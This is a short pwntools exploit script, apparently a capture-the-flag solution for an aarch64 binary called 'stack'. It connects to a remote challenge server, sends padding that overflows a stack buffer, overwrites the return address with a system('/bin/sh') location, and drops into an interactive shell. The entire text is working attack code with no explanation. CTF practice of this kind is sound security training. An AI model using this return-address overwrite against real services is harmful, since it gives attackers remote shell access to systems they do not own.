from pwn import *

context.log_level = 'DEBUG'

# sh = process(["qemu-aarch64", "-g", "1233", "-L", "/usr/aarch64-linux-gnu", "./stack"])
# sh = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./stack"])
sh = remote("node4.buuoj.cn", 29896)


elf = ELF('./stack')
system_binsh_addr = 0x4000000000 + 0x93c

sh.recvuntil(b"Please leave your name:\n")
sh.sendline(b"A"*(0x30-0x08) + p64(system_binsh_addr))

sh.interactive()
